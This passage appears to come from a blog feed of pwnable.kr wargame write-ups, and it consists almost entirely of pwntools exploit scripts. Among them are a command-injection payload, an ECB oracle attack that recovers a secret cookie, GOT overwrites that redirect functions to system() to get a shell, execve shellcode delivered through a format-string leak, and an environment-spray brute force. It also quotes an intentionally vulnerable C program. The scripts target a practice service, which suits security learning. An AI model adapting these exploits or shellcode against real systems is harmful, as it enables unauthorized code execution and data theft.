        <content type="html"><![CDATA[<h1 id="1-loveletter"><a href="#1-loveletter" class="headerlink" title="1.loveletter"></a>1.loveletter</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><a id="more"></a><pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'nv sh -c bash '</span> <span class="token operator">+</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token number">14</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'|\x01'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-crypto1"><a href="#2-crypto1" class="headerlink" title="2.crypto1"></a>2.crypto1</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>cookie<span class="token operator">=</span><span class="token string">''</span>t<span class="token operator">=</span><span class="token string">'1234567890abcdefghijklmnopqrstuvwxyz-_'</span><span class="token keyword">def</span> <span class="token function">getmessage</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span><span class="token number">9006</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ID\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'PW\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'sending encrypted data ('</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">getcookie</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> cookie    s<span class="token operator">=</span><span class="token string">'-'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token operator">-</span>n<span class="token operator">%</span><span class="token number">64</span><span class="token punctuation">)</span>    s1<span class="token operator">=</span>getmessage<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    s1<span class="token operator">=</span>s1<span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">:</span><span class="token number">128</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> t<span class="token punctuation">:</span>        s<span class="token operator">=</span><span class="token string">'-'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">63</span><span class="token operator">-</span>len<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>cookie<span class="token operator">+</span>i        s2<span class="token operator">=</span>getmessage<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        s2<span class="token operator">=</span>s2<span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">:</span><span class="token number">128</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> s1<span class="token operator">==</span>s2<span class="token punctuation">:</span>            cookie<span class="token operator">+=</span>i            <span class="token keyword">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    getcookie<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-bf"><a href="#3-bf" class="headerlink" title="3.bf"></a>3.bf</h1><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>s<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./bf'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#s=remote('pwnable.kr',9001)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>breakpoints<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">0x08048648</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#gdb.attach(s,gdbscript='\n'.join(['b *'+str(x) for x in breakpoints])+'c 5\n')</span><span class="token comment" spellcheck="true">#libc = ELF('./bf_libc.so')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>s<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token operator">=</span><span class="token number">0x0804A0A0</span>putchar<span class="token operator">=</span><span class="token number">0x0804a030</span>memset<span class="token operator">=</span><span class="token number">0x0804a02c</span>fgets<span class="token operator">=</span><span class="token number">0x0804a010</span>main_addr<span class="token operator">=</span><span class="token number">0x8048671</span>payload<span class="token operator">=</span><span class="token string">''</span><span class="token comment" spellcheck="true">#move putchar+4</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token punctuation">(</span>putchar<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak putchar</span>payload<span class="token operator">+=</span><span class="token string">'.&lt;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">'.'</span><span class="token comment" spellcheck="true">#overwrite putchar to main</span>payload<span class="token operator">+=</span><span class="token string">',>'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment" spellcheck="true">#move fgets</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token punctuation">(</span>putchar<span class="token operator">+</span><span class="token number">4</span><span class="token operator">-</span>fgets<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#overwrite fgets to system</span>payload<span class="token operator">+=</span><span class="token string">',>'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment" spellcheck="true">#move memset</span>payload<span class="token operator">+=</span><span class="token string">'>'</span><span class="token operator">*</span><span class="token punctuation">(</span>memset<span class="token operator">-</span>fgets<span class="token number">-4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#overwrite memset to fgets</span>payload<span class="token operator">+=</span><span class="token string">',>'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment" spellcheck="true">#run putchar()-> main -></span>payload<span class="token operator">+=</span><span class="token string">'.'</span>s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>putchar_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>endianness<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'putchar_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>putchar_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr<span class="token operator">=</span>putchar_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'putchar'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>gets_addr<span class="token operator">=</span>putchar_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'putchar'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>gets_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-kr-6</title>
      <link href="/2019/04/30/pwnable-kr-6/"/>
      <url>/2019/04/30/pwnable-kr-6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-echo2"><a href="#1-echo2" class="headerlink" title="1.echo2"></a>1.echo2</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><a id="more"></a><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> <span class="token number">9011</span><span class="token punctuation">)</span>shellcode<span class="token operator">=</span><span class="token string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name? :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%9$p"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x20</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">fun_with_UAF_and_FSB :<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-alloca"><a href="#2-alloca" class="headerlink" title="2.alloca"></a>2.alloca</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">callme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">clear_newlines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        c <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token string">'\n'</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> g_canary<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">check_canary</span><span class="token punctuation">(</span><span class="token keyword">int</span> canary<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> canary <span class="token operator">^</span> g_canary<span class="token punctuation">;</span>    <span class="token keyword">int</span> canary_after <span class="token operator">=</span> canary<span class="token punctuation">;</span>    <span class="token keyword">int</span> canary_before <span class="token operator">=</span> g_canary<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"canary before using buffer : %d\n"</span><span class="token punctuation">,</span> canary_before<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"canary after using buffer : %d\n\n"</span><span class="token punctuation">,</span> canary_after<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>result <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"what the ....??? how did you messed this buffer????\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I told you so. its trivially easy to prevent BOF :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"therefore as you can see, it is easy to make secure software\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> size<span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> buffer<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- BOF(buffer overflow) is very easy to prevent. here is how to.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   1. allocate the buffer size only as you need it\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   2. know your buffer size and limit the input length\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- simple right?. let me show you.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- whats the maximum length of your buffer?(byte) : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">clear_newlines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- give me your random canary number to prove there is no BOF : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_canary<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">clear_newlines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- ok lets allocate a buffer of length %d\n\n"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    buffer <span class="token operator">=</span> <span class="token function">alloca</span><span class="token punctuation">(</span> size <span class="token operator">+</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 4 is for canary</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- now, lets put canary at the end of the buffer and get your data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- don't worry! fgets() securely limits your input after %d bytes :)\n"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- if canary is not changed, we can prove there is no BOF :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>buffer<span class="token operator">+</span>size<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_canary<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// canary will detect overflow.</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// there is no way you can exploit this.</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- now lets check canary to see if there was overflow\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">check_canary</span><span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buffer<span class="token operator">+</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><p><a href="https://gist.github.com/tsarpaul/d6a10c3f271ce58d20633a872aec96b9">https://gist.github.com/tsarpaul/d6a10c3f271ce58d20633a872aec96b9</a></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># overwrite $ebp-0x4 with ret.</span><span class="token comment" spellcheck="true"># bruteforce the program so ret will contain env, which is sprayed with pointers to shell function</span>ret <span class="token operator">=</span> <span class="token string">"-4759552"</span>spray <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x80485ab</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">30000</span>env <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;str(a):spray for a in range(12)&amp;#125;</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># Took me about 12 tries</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'~/Downloads/alloca'</span><span class="token punctuation">,</span> env<span class="token operator">=</span>env<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-68'</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-rsa-calculator"><a href="#3-rsa-calculator" class="headerlink" title="3.rsa_calculator"></a>3.rsa_calculator</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve 1"></a>solve 1</h2><p>overflow func</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">'''learn from Gros'''</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> binascii <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> next_prime<span class="token punctuation">,</span> iroot<span class="token punctuation">,</span>invertBINARY_FILE <span class="token operator">=</span> <span class="token string">'./rsa_calculator'</span>REMOTE <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> <span class="token number">9012</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">setup_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    binary<span class="token punctuation">,</span> libc<span class="token punctuation">,</span> preload <span class="token operator">=</span> None<span class="token punctuation">,</span> None<span class="token punctuation">,</span> <span class="token boolean">False</span>    local_libc <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>    task_libc <span class="token operator">=</span> <span class="token string">'./libc.so.6'</span>    env <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>PRELOAD<span class="token punctuation">:</span>        local_libc <span class="token operator">=</span> task_libc        env <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'LD_PRELOAD': task_libc&amp;#125;</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>BINARY<span class="token punctuation">:</span>        binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span>BINARY_FILE<span class="token punctuation">)</span>        context<span class="token punctuation">.</span>arch <span class="token operator">=</span> binary<span class="token punctuation">.</span>arch    <span class="token keyword">if</span> args<span class="token punctuation">.</span>DBG<span class="token punctuation">:</span>        context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>     <span class="token keyword">if</span> args<span class="token punctuation">.</span>REMOTE<span class="token punctuation">:</span>        <span class="token keyword">if</span> args<span class="token punctuation">.</span>LIBC<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>task_libc<span class="token punctuation">)</span>        s <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>REMOTE<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> args<span class="token punctuation">.</span>LIBC<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>local_libc<span class="token punctuation">)</span>        s <span class="token operator">=</span> process<span class="token punctuation">(</span>BINARY_FILE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'/dev/null'</span><span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> env<span class="token operator">=</span>env<span class="token punctuation">)</span>        <span class="token keyword">if</span> args<span class="token punctuation">.</span>GDB<span class="token punctuation">:</span>            context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>            context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-e'</span><span class="token punctuation">]</span>            breakpoints <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x401408</span><span class="token punctuation">,</span> <span class="token number">0x400e97</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># ret from rsa_encrypt</span>            gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>s<span class="token punctuation">,</span> exe<span class="token operator">=</span>BINARY_FILE<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> breakpoints<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token punctuation">,</span> binary<span class="token punctuation">,</span> libc<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    s<span class="token punctuation">,</span> binary<span class="token punctuation">,</span> libc <span class="token operator">=</span> setup_connection<span class="token punctuation">(</span><span class="token punctuation">)</span>    context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>    g_pbuf <span class="token operator">=</span> <span class="token 